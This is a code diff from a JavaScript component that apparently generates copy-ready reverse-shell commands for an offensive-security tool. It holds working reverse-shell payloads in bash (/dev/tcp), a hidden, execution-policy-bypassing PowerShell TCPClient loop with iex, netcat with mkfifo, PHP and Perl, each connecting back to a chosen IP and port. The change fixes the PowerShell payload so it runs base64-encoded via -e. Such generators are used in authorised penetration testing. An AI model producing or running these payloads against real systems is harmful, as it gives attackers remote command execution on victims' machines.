@@ -34,8 +34,8 @@ export default (props) => {
 	
 	const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
 	const ps = `powershell  -W Hidden -nop -ep bypass -NoExit -c `;
-	const pspayload = `$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '4ndr34z>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-	let ps16 = Buffer.from(pspayload, 'utf16le')
+	const pspayload = `"$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '4ndr34z>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
+	let ps16 = Buffer.from(pspayload.replace(/\"/g, ""), 'utf16le')
 	const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f`;
 	const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
 	const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
@@ -325,7 +325,7 @@ export default (props) => {
 						Copy the reverse shell
 					</Button>
 				</Clipboard>
-				<Clipboard component='a' data-clipboard-text={ps+btoa(ps16)}>
+				<Clipboard component='a' data-clipboard-text={ps.replace("-c","-e")+btoa(ps16)}>
 					<Button
 						type='dashed'
 						onClick={successInfoBase64}
